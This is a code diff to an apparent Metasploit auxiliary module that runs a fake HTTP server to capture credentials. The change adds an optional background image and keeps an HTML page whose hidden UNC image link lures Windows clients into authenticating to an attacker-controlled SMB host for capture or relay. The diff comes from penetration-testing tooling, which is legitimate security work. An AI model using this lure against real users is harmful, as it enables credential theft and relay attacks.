@@ -43,7 +43,8 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 
 		register_options(
 			[
-				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ])
+				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
+				OptPath.new('BGIMAGE',    [ false, "The background image to use for the default web page", nil ])
 			], self.class)
 	end
 
@@ -53,8 +54,9 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 	end
 
 	def run
-		@myhost = datastore['SRVHOST']
-		@myport = datastore['SRVPORT']
+		@bgimage = datastore['BGIMAGE']
+		@myhost  = datastore['SRVHOST']
+		@myport  = datastore['SRVPORT']
 		exploit()
 	end
 	
@@ -150,10 +152,51 @@ class Auxiliary::Server::Capture::HTTP < Msf::Auxiliary
 		
 		# SMB MITM / RELAY
 		
-		data = "<html><head><title>Connecting...</title></head><body><img src='\\\\#{mysrc}\\public\\loading.jpg' width='1' height='1'></body></html>"
+		body_extra = ""
+		if(@bgimage)
+			img_ext = @bgimage.split(".")[-1].downcase
+			req_ext = req.resource.split(".")[-1]
+			ctypes  =
+			{
+				"jpg"   => "image/jpeg",
+				"jpeg"  => "image/jpeg",
+				"png"   => "image/png",
+				"gif"   => "image/gif",
+			}
+			
+			begin
+				if (img_ext == req_ext.downcase)
+
+					ctype = ctypes[img_ext] || ctypes["jpg"]
+					idata = ""
+					isize = File.size(@bgimage)
+					
+					fd = File.open(@bgimage)
+					idata = fd.sysread(isize)
+					fd.close
+
+					res = 
+						"HTTP/1.1 200 OK\r\n" +
+						"Host: #{mysrc}\r\n" +
+						"Content-Type: #{ctype}\r\n" +
+						"Content-Length: #{idata.length}\r\n" +
+						"Connection: Close\r\n\r\n#{idata}"			
+
+					cli.syswrite(res)
+					return
+				end
+			rescue ::Exception
+			end
+		
+			body_extra = "<img src='/background.#{img_ext}' width='100%' height='100%'>"
+		end
+		
+		
+		
+		data = "<html><head><title>Connecting...</title></head><body>#{body_extra}<img src='\\\\#{mysrc}\\public\\loading.jpg' width='1' height='1'></body></html>"
 		res  = 
 			"HTTP/1.1 200 OK\r\n" +
-			"Host: #{req['Host'] || datastore['SRVHOST']}\r\n" +
+			"Host: #{mysrc}\r\n" +
 			"Content-Type: text/html\r\n" +
 			"Content-Length: #{data.length}\r\n" +
 			"Connection: Close\r\n\r\n#{data}"
